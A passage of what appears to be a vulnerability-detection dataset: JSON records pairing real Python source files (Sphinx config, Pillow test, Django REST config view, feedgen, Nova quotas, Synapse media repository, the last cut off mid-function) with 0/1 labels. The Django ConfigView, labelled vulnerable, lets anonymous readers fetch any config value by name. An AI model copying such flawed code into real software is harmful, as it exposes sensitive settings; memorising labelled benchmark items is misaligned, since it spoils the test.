manuals.\n#latex_appendices = []\n\n# If false, no module index is generated.\n#latex_domain_indices = True\n\n\n# -- Options for manual page output --------------------------------------------\n\n# One entry per manual page. List of tuples\n# (source start file, name, description, authors, manual section).\nman_pages = [\n    ('index', 'privacyidea-server', u'privacyIDEA Authentication System',\n     [u'Cornelius K\u00f6lbel'], 1)\n]\n\n# If true, show URL addresses after external links.\n#man_show_urls = False\n\n\n# -- Options for Texinfo output ------------------------------------------------\n\n# Grouping the document tree into Texinfo files. List of tuples\n# (source start file, target name, title, author,\n#  dir menu entry, description, category)\ntexinfo_documents = [\n  ('index', 'privacyIDEA', u'privacyIDEA AUthentication System',\n   u'Cornelius K\u00f6lbel', 'privacyIDEA', 'One line description of project.',\n   'Miscellaneous'),\n]\n\n# Documents to append as an appendix to all manuals.\n#texinfo_appendices = []\n\n# If false, no module index is generated.\n#texinfo_domain_indices = True\n\n# How to display URL addresses: 'footnote', 'no', or 'inline'.\n#texinfo_show_urls = 'footnote'\n", "target": 0}
{"idx": 984, "func": "from helper import unittest, PillowTestCase\nfrom PIL import Image\n\nTEST_FILE = \"Tests/images/libtiff_segfault.tif\"\n\nclass TestLibtiffSegfault(PillowTestCase):\n    def test_segfault(self):\n        \"\"\" This test should not segfault. It will on Pillow <= 3.1.0 and\n            libtiff >= 4.0.0\n            \"\"\"\n\n        try:\n            im = Image.open(TEST_FILE)\n            im.load()\n        except IOError:\n            self.assertTrue(True, \"Got expected IOError\")\n        except Exception:\n            self.fail(\"Should have returned IOError\")\n\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "target": 0}
{"idx": 985, "func": "from rest_framework.status import HTTP_400_BAD_REQUEST\nfrom rest_framework.views import APIView\n\nfrom backend.response import FormattedResponse\nfrom config import config\nfrom backend.permissions import AdminOrAnonymousReadOnly\n\n\nclass ConfigView(APIView):\n    throttle_scope = \"config\"\n    permission_classes = (AdminOrAnonymousReadOnly,)\n\n    def get(self, request, name=None):\n        if name is None:\n            if request.user.is_staff:\n                return FormattedResponse(config.get_all())\n            return FormattedResponse(config.get_all_non_sensitive())\n        return FormattedResponse(config.get(name))\n\n    def post(self, request, name):\n        if \"value\" not in request.data:\n            return FormattedResponse(status=HTTP_400_BAD_REQUEST)\n        config.set(name, request.data.get(\"value\"))\n        return FormattedResponse()\n\n    def patch(self, request, name):\n        if \"value\" not in request.data:\n            return FormattedResponse(status=HTTP_400_BAD_REQUEST)\n        if config.get(name) is not None and isinstance(config.get(name), list):\n            config.set(\"name\", config.get(name).append(request.data[\"value\"]))\n            return FormattedResponse()\n        config.set(name, request.data.get(\"value\"))\n        return FormattedResponse()\n", "target": 1}
{"idx": 986, "func": "# -*- coding: utf-8 -*-\n'''\n    feedgen.ext.dc\n    ~~~~~~~~~~~~~~~~~~~\n\n    Extends the FeedGenerator to add Dubline Core Elements to the feeds.\n\n    Descriptions partly taken from\n    http://dublincore.org/documents/dcmi-terms/#elements-coverage\n\n    :copyright: 2013-2017, Lars Kiesow <lkiesow@uos.de>\n\n    :license: FreeBSD and LGPL, see license.* for more details.\n'''\n\nfrom feedgen.ext.base import BaseExtension\nfrom feedgen.util import xml_elem\n\n\nclass DcBaseExtension(BaseExtension):\n    '''Dublin Core Elements extension for podcasts.\n    '''\n\n    def __init__(self):\n        # http://dublincore.org/documents/usageguide/elements.shtml\n        # http://dublincore.org/documents/dces/\n        # http://dublincore.org/documents/dcmi-terms/\n        self._dcelem_contributor = None\n        self._dcelem_coverage = None\n        self._dcelem_creator = None\n        self._dcelem_date = None\n        self._dcelem_description = None\n        self._dcelem_format = None\n        self._dcelem_identifier = None\n        self._dcelem_language = None\n        self._dcelem_publisher = None\n        self._dcelem_relation = None\n        self._dcelem_rights = None\n        self._dcelem_source = None\n        self._dcelem_subject = None\n        self._dcelem_title = None\n        self._dcelem_type = None\n\n    def extend_ns(self):\n        return {'dc': 'http://purl.org/dc/elements/1.1/'}\n\n    def _extend_xml(self, xml_element):\n        '''Extend xml_element with set DC fields.\n\n        :param xml_element: etree element\n        '''\n        DCELEMENTS_NS = 'http://purl.org/dc/elements/1.1/'\n\n        for elem in ['contributor', 'coverage', 'creator', 'date',\n                     'description', 'language', 'publisher', 'relation',\n                     'rights', 'source', 'subject', 'title', 'type', 'format',\n                     'identifier']:\n            if hasattr(self, '_dcelem_%s' % elem):\n                for val in getattr(self, '_dcelem_%s' % elem) or []:\n                    node = xml_elem('{%s}%s' % (DCELEMENTS_NS, elem),\n                                    xml_element)\n                    node.text = val\n\n    def extend_atom(self, atom_feed):\n        '''Extend an Atom feed with the set DC fields.\n\n        :param atom_feed: The feed root element\n        :returns: The feed root element\n        '''\n\n        self._extend_xml(atom_feed)\n\n        return atom_feed\n\n    def extend_rss(self, rss_feed):\n        '''Extend a RSS feed with the set DC fields.\n\n        :param rss_feed: The feed root element\n        :returns: The feed root element.\n        '''\n        channel = rss_feed[0]\n        self._extend_xml(channel)\n\n        return rss_feed\n\n    def dc_contributor(self, contributor=None, replace=False):\n        '''Get or set the dc:contributor which is an entity responsible for\n        making contributions to the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-contributor\n\n        :param contributor: Contributor or list of contributors.\n        :param replace: Replace alredy set contributors (deault: False).\n        :returns: List of contributors.\n        '''\n        if contributor is not None:\n            if not isinstance(contributor, list):\n                contributor = [contributor]\n            if replace or not self._dcelem_contributor:\n                self._dcelem_contributor = []\n            self._dcelem_contributor += contributor\n        return self._dcelem_contributor\n\n    def dc_coverage(self, coverage=None, replace=True):\n        '''Get or set the dc:coverage which indicated the spatial or temporal\n        topic of the resource, the spatial applicability of the resource, or\n        the jurisdiction under which the resource is relevant.\n\n        Spatial topic and spatial applicability may be a named place or a\n        location specified by its geographic coordinates. Temporal topic may be\n        a named period, date, or date range. A jurisdiction may be a named\n        administrative entity or a geographic place to which the resource\n        applies. Recommended best practice is to use a controlled vocabulary\n        such as the Thesaurus of Geographic Names [TGN]. Where appropriate,\n        named places or time periods can be used in preference to numeric\n        identifiers such as sets of coordinates or date ranges.\n\n        References:\n        [TGN] http://www.getty.edu/research/tools/vocabulary/tgn/index.html\n\n        :param coverage: Coverage of the feed.\n        :param replace: Replace already set coverage (default: True).\n        :returns: Coverage of the feed.\n        '''\n        if coverage is not None:\n            if not isinstance(coverage, list):\n                coverage = [coverage]\n            if replace or not self._dcelem_coverage:\n                self._dcelem_coverage = []\n            self._dcelem_coverage = coverage\n        return self._dcelem_coverage\n\n    def dc_creator(self, creator=None, replace=False):\n        '''Get or set the dc:creator which is an entity primarily responsible\n        for making the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-creator\n\n        :param creator: Creator or list of creators.\n        :param replace: Replace alredy set creators (deault: False).\n        :returns: List of creators.\n        '''\n        if creator is not None:\n            if not isinstance(creator, list):\n                creator = [creator]\n            if replace or not self._dcelem_creator:\n                self._dcelem_creator = []\n            self._dcelem_creator += creator\n        return self._dcelem_creator\n\n    def dc_date(self, date=None, replace=True):\n        '''Get or set the dc:date which describes a point or period of time\n        associated with an event in the lifecycle of the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-date\n\n        :param date: Date or list of dates.\n        :param replace: Replace alredy set dates (deault: True).\n        :returns: List of dates.\n        '''\n        if date is not None:\n            if not isinstance(date, list):\n                date = [date]\n            if replace or not self._dcelem_date:\n                self._dcelem_date = []\n            self._dcelem_date += date\n        return self._dcelem_date\n\n    def dc_description(self, description=None, replace=True):\n        '''Get or set the dc:description which is an account of the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-description\n\n        :param description: Description or list of descriptions.\n        :param replace: Replace alredy set descriptions (deault: True).\n        :returns: List of descriptions.\n        '''\n        if description is not None:\n            if not isinstance(description, list):\n                description = [description]\n            if replace or not self._dcelem_description:\n                self._dcelem_description = []\n            self._dcelem_description += description\n        return self._dcelem_description\n\n    def dc_format(self, format=None, replace=True):\n        '''Get or set the dc:format which describes the file format, physical\n        medium, or dimensions of the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-format\n\n        :param format: Format of the resource or list of formats.\n        :param replace: Replace alredy set format (deault: True).\n        :returns: Format of the resource.\n        '''\n        if format is not None:\n            if not isinstance(format, list):\n                format = [format]\n            if replace or not self._dcelem_format:\n                self._dcelem_format = []\n            self._dcelem_format += format\n        return self._dcelem_format\n\n    def dc_identifier(self, identifier=None, replace=True):\n        '''Get or set the dc:identifier which should be an unambiguous\n        reference to the resource within a given context.\n\n        For more inidentifierion see:\n        http://dublincore.org/documents/dcmi-terms/#elements-identifier\n\n        :param identifier: Identifier of the resource or list of identifiers.\n        :param replace: Replace alredy set identifier (deault: True).\n        :returns: Identifiers of the resource.\n        '''\n        if identifier is not None:\n            if not isinstance(identifier, list):\n                identifier = [identifier]\n            if replace or not self._dcelem_identifier:\n                self._dcelem_identifier = []\n            self._dcelem_identifier += identifier\n        return self._dcelem_identifier\n\n    def dc_language(self, language=None, replace=True):\n        '''Get or set the dc:language which describes a language of the\n        resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-language\n\n        :param language: Language or list of languages.\n        :param replace: Replace alredy set languages (deault: True).\n        :returns: List of languages.\n        '''\n        if language is not None:\n            if not isinstance(language, list):\n                language = [language]\n            if replace or not self._dcelem_language:\n                self._dcelem_language = []\n            self._dcelem_language += language\n        return self._dcelem_language\n\n    def dc_publisher(self, publisher=None, replace=False):\n        '''Get or set the dc:publisher which is an entity responsible for\n        making the resource available.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-publisher\n\n        :param publisher: Publisher or list of publishers.\n        :param replace: Replace alredy set publishers (deault: False).\n        :returns: List of publishers.\n        '''\n        if publisher is not None:\n            if not isinstance(publisher, list):\n                publisher = [publisher]\n            if replace or not self._dcelem_publisher:\n                self._dcelem_publisher = []\n            self._dcelem_publisher += publisher\n        return self._dcelem_publisher\n\n    def dc_relation(self, relation=None, replace=False):\n        '''Get or set the dc:relation which describes a related resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-relation\n\n        :param relation: Relation or list of relations.\n        :param replace: Replace alredy set relations (deault: False).\n        :returns: List of relations.\n        '''\n        if relation is not None:\n            if not isinstance(relation, list):\n                relation = [relation]\n            if replace or not self._dcelem_relation:\n                self._dcelem_relation = []\n            self._dcelem_relation += relation\n        return self._dcelem_relation\n\n    def dc_rights(self, rights=None, replace=False):\n        '''Get or set the dc:rights which may contain information about rights\n        held in and over the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-rights\n\n        :param rights: Rights information or list of rights information.\n        :param replace: Replace alredy set rightss (deault: False).\n        :returns: List of rights information.\n        '''\n        if rights is not None:\n            if not isinstance(rights, list):\n                rights = [rights]\n            if replace or not self._dcelem_rights:\n                self._dcelem_rights = []\n            self._dcelem_rights += rights\n        return self._dcelem_rights\n\n    def dc_source(self, source=None, replace=False):\n        '''Get or set the dc:source which is a related resource from which the\n        described resource is derived.\n\n        The described resource may be derived from the related resource in\n        whole or in part. Recommended best practice is to identify the related\n        resource by means of a string conforming to a formal identification\n        system.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-source\n\n        :param source: Source or list of sources.\n        :param replace: Replace alredy set sources (deault: False).\n        :returns: List of sources.\n        '''\n        if source is not None:\n            if not isinstance(source, list):\n                source = [source]\n            if replace or not self._dcelem_source:\n                self._dcelem_source = []\n            self._dcelem_source += source\n        return self._dcelem_source\n\n    def dc_subject(self, subject=None, replace=False):\n        '''Get or set the dc:subject which describes the topic of the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-subject\n\n        :param subject: Subject or list of subjects.\n        :param replace: Replace alredy set subjects (deault: False).\n        :returns: List of subjects.\n        '''\n        if subject is not None:\n            if not isinstance(subject, list):\n                subject = [subject]\n            if replace or not self._dcelem_subject:\n                self._dcelem_subject = []\n            self._dcelem_subject += subject\n        return self._dcelem_subject\n\n    def dc_title(self, title=None, replace=True):\n        '''Get or set the dc:title which is a name given to the resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-title\n\n        :param title: Title or list of titles.\n        :param replace: Replace alredy set titles (deault: False).\n        :returns: List of titles.\n        '''\n        if title is not None:\n            if not isinstance(title, list):\n                title = [title]\n            if replace or not self._dcelem_title:\n                self._dcelem_title = []\n            self._dcelem_title += title\n        return self._dcelem_title\n\n    def dc_type(self, type=None, replace=False):\n        '''Get or set the dc:type which describes the nature or genre of the\n        resource.\n\n        For more information see:\n        http://dublincore.org/documents/dcmi-terms/#elements-type\n\n        :param type: Type or list of types.\n        :param replace: Replace alredy set types (deault: False).\n        :returns: List of types.\n        '''\n        if type is not None:\n            if not isinstance(type, list):\n                type = [type]\n            if replace or not self._dcelem_type:\n                self._dcelem_type = []\n            self._dcelem_type += type\n        return self._dcelem_type\n\n\nclass DcExtension(DcBaseExtension):\n    '''Dublin Core Elements extension for podcasts.\n    '''\n\n\nclass DcEntryExtension(DcBaseExtension):\n    '''Dublin Core Elements extension for podcasts.\n    '''\n    def extend_atom(self, entry):\n        '''Add dc elements to an atom item. Alters the item itself.\n\n        :param entry: An atom entry element.\n        :returns: The entry element.\n        '''\n        self._extend_xml(entry)\n        return entry\n\n    def extend_rss(self, item):\n        '''Add dc elements to a RSS item. Alters the item itself.\n\n        :param item: A RSS item element.\n        :returns: The item element.\n        '''\n        self._extend_xml(item)\n        return item\n", "target": 0}
{"idx": 987, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Quotas for instances, volumes, and floating ips.\"\"\"\n\nfrom nova import db\nfrom nova.openstack.common import cfg\nfrom nova import flags\n\n\nquota_opts = [\n    cfg.IntOpt('quota_instances',\n               default=10,\n               help='number of instances allowed per project'),\n    cfg.IntOpt('quota_cores',\n               default=20,\n               help='number of instance cores allowed per project'),\n    cfg.IntOpt('quota_ram',\n               default=50 * 1024,\n               help='megabytes of instance ram allowed per project'),\n    cfg.IntOpt('quota_volumes',\n               default=10,\n               help='number of volumes allowed per project'),\n    cfg.IntOpt('quota_gigabytes',\n               default=1000,\n               help='number of volume gigabytes allowed per project'),\n    cfg.IntOpt('quota_floating_ips',\n               default=10,\n               help='number of floating ips allowed per project'),\n    cfg.IntOpt('quota_metadata_items',\n               default=128,\n               help='number of metadata items allowed per instance'),\n    cfg.IntOpt('quota_injected_files',\n               default=5,\n               help='number of injected files allowed'),\n    cfg.IntOpt('quota_injected_file_content_bytes',\n               default=10 * 1024,\n               help='number of bytes allowed per injected file'),\n    cfg.IntOpt('quota_injected_file_path_bytes',\n               default=255,\n               help='number of bytes allowed per injected file path'),\n    ]\n\nFLAGS = flags.FLAGS\nFLAGS.register_opts(quota_opts)\n\n\nquota_resources = ['metadata_items', 'injected_file_content_bytes',\n        'volumes', 'gigabytes', 'ram', 'floating_ips', 'instances',\n        'injected_files', 'cores']\n\n\ndef _get_default_quotas():\n    defaults = {\n        'instances': FLAGS.quota_instances,\n        'cores': FLAGS.quota_cores,\n        'ram': FLAGS.quota_ram,\n        'volumes': FLAGS.quota_volumes,\n        'gigabytes': FLAGS.quota_gigabytes,\n        'floating_ips': FLAGS.quota_floating_ips,\n        'metadata_items': FLAGS.quota_metadata_items,\n        'injected_files': FLAGS.quota_injected_files,\n        'injected_file_content_bytes':\n            FLAGS.quota_injected_file_content_bytes,\n    }\n    # -1 in the quota flags means unlimited\n    return defaults\n\n\ndef get_class_quotas(context, quota_class, defaults=None):\n    \"\"\"Update defaults with the quota class values.\"\"\"\n\n    if not defaults:\n        defaults = _get_default_quotas()\n\n    quota = db.quota_class_get_all_by_name(context, quota_class)\n    for key in defaults.keys():\n        if key in quota:\n            defaults[key] = quota[key]\n\n    return defaults\n\n\ndef get_project_quotas(context, project_id):\n    defaults = _get_default_quotas()\n    if context.quota_class:\n        get_class_quotas(context, context.quota_class, defaults)\n    quota = db.quota_get_all_by_project(context, project_id)\n    for key in defaults.keys():\n        if key in quota:\n            defaults[key] = quota[key]\n    return defaults\n\n\ndef _get_request_allotment(requested, used, quota):\n    if quota == -1:\n        return requested\n    return quota - used\n\n\ndef allowed_instances(context, requested_instances, instance_type):\n    \"\"\"Check quota and return min(requested_instances, allowed_instances).\"\"\"\n    project_id = context.project_id\n    context = context.elevated()\n    requested_cores = requested_instances * instance_type['vcpus']\n    requested_ram = requested_instances * instance_type['memory_mb']\n    usage = db.instance_data_get_for_project(context, project_id)\n    used_instances, used_cores, used_ram = usage\n    quota = get_project_quotas(context, project_id)\n    allowed_instances = _get_request_allotment(requested_instances,\n                                               used_instances,\n                                               quota['instances'])\n    allowed_cores = _get_request_allotment(requested_cores, used_cores,\n                                           quota['cores'])\n    allowed_ram = _get_request_allotment(requested_ram, used_ram, quota['ram'])\n    if instance_type['vcpus']:\n        allowed_instances = min(allowed_instances,\n                                allowed_cores // instance_type['vcpus'])\n    if instance_type['memory_mb']:\n        allowed_instances = min(allowed_instances,\n                                allowed_ram // instance_type['memory_mb'])\n\n    return min(requested_instances, allowed_instances)\n\n\ndef allowed_volumes(context, requested_volumes, size):\n    \"\"\"Check quota and return min(requested_volumes, allowed_volumes).\"\"\"\n    project_id = context.project_id\n    context = context.elevated()\n    size = int(size)\n    requested_gigabytes = requested_volumes * size\n    used_volumes, used_gigabytes = db.volume_data_get_for_project(context,\n                                                                  project_id)\n    quota = get_project_quotas(context, project_id)\n    allowed_volumes = _get_request_allotment(requested_volumes, used_volumes,\n                                             quota['volumes'])\n    allowed_gigabytes = _get_request_allotment(requested_gigabytes,\n                                               used_gigabytes,\n                                               quota['gigabytes'])\n    if size != 0:\n        allowed_volumes = min(allowed_volumes,\n                              int(allowed_gigabytes // size))\n    return min(requested_volumes, allowed_volumes)\n\n\ndef allowed_floating_ips(context, requested_floating_ips):\n    \"\"\"Check quota and return min(requested, allowed) floating ips.\"\"\"\n    project_id = context.project_id\n    context = context.elevated()\n    used_floating_ips = db.floating_ip_count_by_project(context, project_id)\n    quota = get_project_quotas(context, project_id)\n    allowed_floating_ips = _get_request_allotment(requested_floating_ips,\n                                                  used_floating_ips,\n                                                  quota['floating_ips'])\n    return min(requested_floating_ips, allowed_floating_ips)\n\n\ndef _calculate_simple_quota(context, resource, requested):\n    \"\"\"Check quota for resource; return min(requested, allowed).\"\"\"\n    quota = get_project_quotas(context, context.project_id)\n    allowed = _get_request_allotment(requested, 0, quota[resource])\n    return min(requested, allowed)\n\n\ndef allowed_metadata_items(context, requested_metadata_items):\n    \"\"\"Return the number of metadata items allowed.\"\"\"\n    return _calculate_simple_quota(context, 'metadata_items',\n                                   requested_metadata_items)\n\n\ndef allowed_injected_files(context, requested_injected_files):\n    \"\"\"Return the number of injected files allowed.\"\"\"\n    return _calculate_simple_quota(context, 'injected_files',\n                                   requested_injected_files)\n\n\ndef allowed_injected_file_content_bytes(context, requested_bytes):\n    \"\"\"Return the number of bytes allowed per injected file content.\"\"\"\n    resource = 'injected_file_content_bytes'\n    return _calculate_simple_quota(context, resource, requested_bytes)\n\n\ndef allowed_injected_file_path_bytes(context):\n    \"\"\"Return the number of bytes allowed in an injected file path.\"\"\"\n    return FLAGS.quota_injected_file_path_bytes\n", "target": 1}
{"idx": 988, "func": "# -*- coding: utf-8 -*-\n# Copyright 2014-2016 OpenMarket Ltd\n# Copyright 2018 New Vector Ltd\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport errno\nimport logging\nimport os\nimport shutil\nfrom typing import IO, Dict, List, Optional, Tuple\n\nimport twisted.internet.error\nimport twisted.web.http\nfrom twisted.web.http import Request\nfrom twisted.web.resource import Resource\n\nfrom synapse.api.errors import (\n    FederationDeniedError,\n    HttpResponseException,\n    NotFoundError,\n    RequestSendFailed,\n    SynapseError,\n)\nfrom synapse.config._base import ConfigError\nfrom synapse.logging.context import defer_to_thread\nfrom synapse.metrics.background_process_metrics import run_as_background_process\nfrom synapse.util.async_helpers import Linearizer\nfrom synapse.util.retryutils import NotRetryingDestination\nfrom synapse.util.stringutils import random_string\n\nfrom ._base import (\n    FileInfo,\n    Responder,\n    get_filename_from_headers,\n    respond_404,\n    respond_with_responder,\n)\nfrom .config_resource import MediaConfigResource\nfrom .download_resource import DownloadResource\nfrom .filepath import MediaFilePaths\nfrom .media_storage import MediaStorage\nfrom .preview_url_resource import PreviewUrlResource\nfrom .storage_provider import StorageProviderWrapper\nfrom .thumbnail_resource import ThumbnailResource\nfrom .thumbnailer import Thumbnailer, ThumbnailError\nfrom .upload_resource import UploadResource\n\nlogger = logging.getLogger(__name__)\n\n\nUPDATE_RECENTLY_ACCESSED_TS = 60 * 1000\n\n\nclass MediaRepository:\n    def __init__(self, hs):\n        self.hs = hs\n        self.auth = hs.get_auth()\n        self.client = hs.get_federation_http_client()\n        self.clock = hs.get_clock()\n        self.server_name = hs.hostname\n        self.store = hs.get_datastore()\n        self.max_upload_size = hs.config.max_upload_size\n        self.max_image_pixels = hs.config.max_image_pixels\n\n        self.primary_base_path = hs.config.media_store_path\n        self.filepaths = MediaFilePaths(self.primary_base_path)\n\n        self.dynamic_thumbnails = hs.config.dynamic_thumbnails\n        self.thumbnail_requirements = hs.config.thumbnail_requirements\n\n        self.remote_media_linearizer = Linearizer(name=\"media_remote\")\n\n        self.recently_accessed_remotes = set()\n        self.recently_accessed_locals = set()\n\n        self.federation_domain_whitelist = hs.config.federation_domain_whitelist\n\n        # List of StorageProviders where we should search for media and\n        # potentially upload to.\n        storage_providers = []\n\n        for clz, provider_config, wrapper_config in hs.config.media_storage_providers:\n            backend = clz(hs, provider_config)\n            provider = StorageProviderWrapper(\n                backend,\n                store_local=wrapper_config.store_local,\n                store_remote=wrapper_config.store_remote,\n                store_synchronous=wrapper_config.store_synchronous,\n            )\n            storage_providers.append(provider)\n\n        self.media_storage = MediaStorage(\n            self.hs, self.primary_base_path, self.filepaths, storage_providers\n        )\n\n        self.clock.looping_call(\n            self._start_update_recently_accessed, UPDATE_RECENTLY_ACCESSED_TS\n        )\n\n    def _start_update_recently_accessed(self):\n        return run_as_background_process(\n            \"update_recently_accessed_media\", self._update_recently_accessed\n        )\n\n    async def _update_recently_accessed(self):\n        remote_media = self.recently_accessed_remotes\n        self.recently_accessed_remotes = set()\n\n        local_media = self.recently_accessed_locals\n        self.recently_accessed_locals = set()\n\n        await self.store.update_cached_last_access_time(\n            local_media, remote_media, self.clock.time_msec()\n        )\n\n    def mark_recently_accessed(self, server_name, media_id):\n        \"\"\"Mark the given media as recently accessed.\n\n        Args:\n            server_name (str|None): Origin server of media, or None if local\n            media_id (str): The media ID of the content\n        \"\"\"\n        if server_name:\n            self.recently_accessed_remotes.add((server_name, media_id))\n        else:\n            self.recently_accessed_locals.add(media_id)\n\n    async def create_content(\n        self,\n        media_type: str,\n        upload_name: Optional[str],\n        content: IO,\n        content_length: int,\n        auth_user: str,\n    ) -> str:\n        \"\"\"Store uploaded content for a local user and return the mxc URL\n\n        Args:\n            media_type: The content type of the file.\n            upload_name: The name of the file, if provided.\n            content: A file like object that is the content to store\n            content_length: The length of the content\n            auth_user: The user_id of the uploader\n\n        Returns:\n            The mxc url of the stored content\n        \"\"\"\n\n        media_id = random_string(24)\n\n        file_info = FileInfo(server_name=None, file_id=media_id)\n\n        fname = await self.media_storage.store_file(content, file_info)\n\n        logger.info(\"Stored local media in file %r\", fname)\n\n        await self.store.store_local_media(\n            media_id=media_id,\n            media_type=media_type,\n            time_now_ms=self.clock.time_msec(),\n            upload_name=upload_name,\n            media_length=content_length,\n            user_id=auth_user,\n        )\n\n        await self._generate_thumbnails(None, media_id, media_id, media_type)\n\n        return \"mxc://%s/%s\" % (self.server_name, media_id)\n\n    async def get_local_media(\n        self, request: Request, media_id: str, name: Optional[str]\n    ) -> None:\n        \"\"\"Responds to reqests for local media, if exists, or returns 404.\n\n        Args:\n            request: The incoming request.\n            media_id: The media ID of the content. (This is the same as\n                the file_id for local content.)\n            name: Optional name that, if specified, will be used as\n                the filename in the Content-Disposition header of the response.\n\n        Returns:\n            Resolves once a response has successfully been written to request\n        \"\"\"\n        media_info = await self.store.get_local_media(media_id)\n        if not media_info or media_info[\"quarantined_by\"]:\n            respond_404(request)\n            return\n\n        self.mark_recently_accessed(None, media_id)\n\n        media_type = media_info[\"media_type\"]\n        media_length = media_info[\"media_length\"]\n        upload_name = name if name else media_info[\"upload_name\"]\n        url_cache = media_info[\"url_cache\"]\n\n        file_info = FileInfo(None, media_id, url_cache=url_cache)\n\n        responder = await self.media_storage.fetch_media(file_info)\n        await respond_with_responder(\n            request, responder, media_type, media_length, upload_name\n        )\n\n    async def get_remote_media(\n        self, request: Request, server_name: str, media_id: str, name: Optional[str]\n    ) -> None:\n        \"\"\"Respond to requests for remote media.\n\n        Args:\n            request: The incoming request.\n            server_name: Remote server_name where the media originated.\n            media_id: The media ID of the content (as defined by the remote server).\n            name: Optional name that, if specified, will be used as\n                the filename in the Content-Disposition header of the response.\n\n        Returns:\n            Resolves once a response has successfully been written to request\n        \"\"\"\n        if (\n            self.federation_domain_whitelist is not None\n            and server_name not in self.federation_domain_whitelist\n        ):\n            raise FederationDeniedError(server_name)\n\n        self.mark_recently_accessed(server_name, media_id)\n\n        # We linearize here to ensure that we don't try and download remote\n        # media multiple times concurrently\n        key = (server_name, media_id)\n        with (await self.remote_media_linearizer.queue(key)):\n            responder, media_info = await self._get_remote_media_impl(\n                server_name, media_id\n            )\n\n        # We deliberately stream the file outside the lock\n        if responder:\n            media_type = media_info[\"media_type\"]\n            media_length = media_info[\"media_length\"]\n            upload_name = name if name else media_info[\"upload_name\"]\n            await respond_with_responder(\n                request, responder, media_type, media_length, upload_name\n            )\n        else:\n            respond_404(request)\n\n    async def get_remote_media_info(self, server_name: str, media_id: str) -> dict:\n        \"\"\"Gets the media info associated with the remote file, downloading\n        if necessary.\n\n        Args:\n            server_name: Remote server_name where the media originated.\n            media_id: The media ID of the content (as defined by the remote server).\n\n        Returns:\n            The media info of the file\n        \"\"\"\n        if (\n            self.federation_domain_whitelist is not None\n            and server_name not in self.federation_domain_whitelist\n        ):\n            raise FederationDeniedError(server_name)\n\n        # We linearize here to ensure that we don't try and download remote\n        # media multiple times concurrently\n        key = (server_name, media_id)\n        with (await self.remote_media_linearizer.queue(key)):\n            responder, media_info = await self._get_remote_media_impl(\n                server_name, media_id\n            )\n\n        # Ensure we actually use the responder so that it releases resources\n        if responder:\n            with responder:\n                pass\n\n        return media_info\n\n    async def _get_remote_media_impl(\n        self, server_name: str, media_id: str\n    ) -> Tuple[Optional[Responder], dict]:\n        \"\"\"Looks for media in local cache, if not there then attempt to\n        download from remote server.\n\n        Args:\n            server_name (str): Remote server_name where the media originated.\n            media_id (str): The media ID of the content (as defined by the\n                remote server).\n\n        Returns:\n            A tuple of responder and the media info of the file.\n        \"\"\"\n        media_info = await self.store.get_cached_remote_media(server_name, media_id)\n\n        # file_id is the ID we use to track the file locally. If we've already\n        # seen the file then reuse the existing ID, otherwise genereate a new\n        # one.\n\n        # If we have an entry in the DB, try and look for it\n        if media_info:\n            file_id = media_info[\"filesystem_id\"]\n            file_info = FileInfo(server_name, file_id)\n\n            if media_info[\"quarantined_by\"]:\n                logger.info(\"Media is quarantined\")\n                raise NotFoundError()\n\n            responder = await self.media_storage.fetch_media(file_info)\n            if responder:\n                return responder, media_info\n\n        # Failed to find the file anywhere, lets download it.\n\n        try:\n            media_info = await self._download_remote_file(server_name, media_id,)\n        except SynapseError:\n            raise\n        except Exception as e:\n            # An exception may be because we downloaded media in another\n            # process, so let's check if we magically have the media.\n            media_info = await self.store.get_cached_remote_media(server_name, media_id)\n            if not media_info:\n                raise e\n\n        file_id = media_info[\"filesystem_id\"]\n        file_info = FileInfo(server_name, file_id)\n\n        # We generate thumbnails even if another process downloaded the media\n        # as a) it's conceivable that the other download request dies before it\n        # generates thumbnails, but mainly b) we want to be sure the thumbnails\n        # have finished being generated before responding to the client,\n        # otherwise they'll request thumbnails and get a 404 if they're not\n        # ready yet.\n        await self._generate_thumbnails(\n            server_name, media_id, file_id, media_info[\"media_type\"]\n        )\n\n        responder = await self.media_storage.fetch_media(file_info)\n        return responder, media_info\n\n    async def _download_remote_file(self, server_name: str, media_id: str,) -> dict:\n        \"\"\"Attempt to download the remote file from the given server name,\n        using the given file_id as the local id.\n\n        Args:\n            server_name: Originating server\n            media_id: The media ID of the content (as defined by the\n                remote server). This is different than the file_id, which is\n                locally generated.\n            file_id: Local file ID\n\n        Returns:\n            The media info of the file.\n        \"\"\"\n\n        file_id = random_string(24)\n\n        file_info = FileInfo(server_name=server_name, file_id=file_id)\n\n        with self.media_storage.store_into_file(file_info) as (f, fname, finish):\n            request_path = \"/\".join(\n                (\"/_matrix/media/r0/download\", server_name, media_id)\n    